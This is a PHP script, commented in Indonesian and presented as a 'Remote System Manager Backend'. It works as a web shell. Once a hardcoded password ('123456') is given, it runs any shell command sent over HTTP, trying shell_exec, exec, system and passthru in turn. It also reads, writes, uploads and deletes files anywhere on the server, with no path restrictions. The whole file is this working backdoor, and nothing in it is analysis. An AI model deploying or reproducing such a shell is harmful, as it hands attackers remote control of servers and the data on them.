<?php
/**
 * Remote System Manager Backend
 * 
 * Mendukung action: cmd, list, read, write, upload, delete
 * Password dicek melalui parameter GET/POST 'password'
 * 
 * Konfigurasi: ganti PASSWORD di bawah jika perlu (default: 123456)
 */

// ========== KONFIGURASI ==========
define('PASSWORD', '123456');   // ganti dengan password yang sama di frontend
// =================================

// Ambil password dari GET atau POST
$password = isset($_REQUEST['password']) ? $_REQUEST['password'] : '';
if ($password !== PASSWORD) {
    http_response_code(403);
    die('403 Forbidden - Invalid password');
}

// Ambil action
$action = isset($_REQUEST['action']) ? $_REQUEST['action'] : '';

// Header default
header('Content-Type: text/plain; charset=utf-8');

switch ($action) {
    case 'cmd':
        handleCmd();
        break;
    case 'list':
        handleList();
        break;
    case 'read':
        handleRead();
        break;
    case 'write':
        handleWrite();
        break;
    case 'upload':
        handleUpload();
        break;
    case 'delete':
        handleDelete();
        break;
    default:
        http_response_code(400);
        die('400 Bad Request - Missing or invalid action');
}

// ========== FUNCTIONS ==========

function handleCmd() {
    $cmd = isset($_REQUEST['cmd']) ? $_REQUEST['cmd'] : '';
    if (empty($cmd)) {
        die('No command provided');
    }
    // Hati-hati: menjalankan perintah langsung. Pastikan environment aman.
    if (function_exists('shell_exec')) {
        $output = shell_exec($cmd . ' 2>&1');
    } elseif (function_exists('exec')) {
        exec($cmd . ' 2>&1', $outputArr, $ret);
        $output = implode("\n", $outputArr);
    } elseif (function_exists('system')) {
        ob_start();
        system($cmd . ' 2>&1');
        $output = ob_get_clean();
    } elseif (function_exists('passthru')) {
        ob_start();
        passthru($cmd . ' 2>&1');
        $output = ob_get_clean();
    } else {
        $output = "Error: Tidak ada fungsi eksekusi perintah yang tersedia.";
    }
    echo $output;
}

function handleList() {
    $path = isset($_REQUEST['path']) ? $_REQUEST['path'] : '/';
    // Bersihkan path
    $path = realpath($path);
    if ($path === false || !is_dir($path)) {
        http_response_code(404);
        die('Directory not found: ' . $_REQUEST['path']);
    }
    
    $items = [];
    $scan = scandir($path);
    if ($scan === false) {
        http_response_code(500);
        die('Failed to read directory');
    }
    
    foreach ($scan as $entry) {
        if ($entry === '.' || $entry === '..') continue;
        $fullPath = $path . DIRECTORY_SEPARATOR . $entry;
        $type = is_dir($fullPath) ? 'dir' : 'file';
        $size = is_file($fullPath) ? filesize($fullPath) : null;
        $items[] = [
            'name' => $entry,
            'type' => $type,
            'size' => $size
        ];
    }
    
    // Sorting: directories first, then files, both alphabetically
    usort($items, function($a, $b) {
        if ($a['type'] === $b['type']) {
            return strcasecmp($a['name'], $b['name']);
        }
        return ($a['type'] === 'dir') ? -1 : 1;
    });
    
    header('Content-Type: application/json');
    echo json_encode($items);
}

function handleRead() {
    $path = $_REQUEST['path'] ?? '';
    $realPath = realpath($path);
    if ($realPath === false || !is_file($realPath)) {
        http_response_code(404);
        die('File not found: ' . $path);
    }
    // Baca dan tampilkan (untuk file teks)
    readfile($realPath);
}

function handleWrite() {
    if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
        http_response_code(405);
        die('Method Not Allowed');
    }
    $path = $_REQUEST['path'] ?? '';
    $content = $_REQUEST['content'] ?? '';
    if (empty($path)) {
        http_response_code(400);
        die('No path specified');
    }
    $result = file_put_contents($path, $content);
    if ($result === false) {
        http_response_code(500);
        die('Failed to write file');
    }
    echo 'OK - ' . $result . ' bytes written';
}

function handleUpload() {
    if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
        http_response_code(405);
        die('Method Not Allowed');
    }
    $destDir = $_POST['path'] ?? '/tmp/';
    // Pastikan direktori tujuan ada
    if (!is_dir($destDir)) {
        mkdir($destDir, 0755, true);
    }
    $destDir = realpath($destDir);
    if ($destDir === false) {
        http_response_code(400);
        die('Invalid destination directory');
    }
    
    if (!isset($_FILES['file'])) {
        http_response_code(400);
        die('No file uploaded');
    }
    
    $file = $_FILES['file'];
    if ($file['error'] !== UPLOAD_ERR_OK) {
        http_response_code(500);
        die('Upload error code: ' . $file['error']);
    }
    
    $targetPath = $destDir . DIRECTORY_SEPARATOR . basename($file['name']);
    if (!move_uploaded_file($file['tmp_name'], $targetPath)) {
        http_response_code(500);
        die('Failed to move uploaded file');
    }
    echo 'OK - File uploaded to ' . $targetPath;
}

function handleDelete() {
    $path = $_REQUEST['path'] ?? '';
    $realPath = realpath($path);
    if ($realPath === false) {
        http_response_code(404);
        die('Path not found: ' . $path);
    }
    
    if (is_dir($realPath)) {
        // Hapus direktori (hanya jika kosong)
        if (!rmdir($realPath)) {
            http_response_code(500);
            die('Failed to remove directory (mungkin tidak kosong)');
        }
        echo 'OK - Directory deleted';
    } elseif (is_file($realPath)) {
        if (!unlink($realPath)) {
            http_response_code(500);
            die('Failed to delete file');
        }
        echo 'OK - File deleted';
    } else {
        http_response_code(400);
        die('Unknown file type');
    }
}
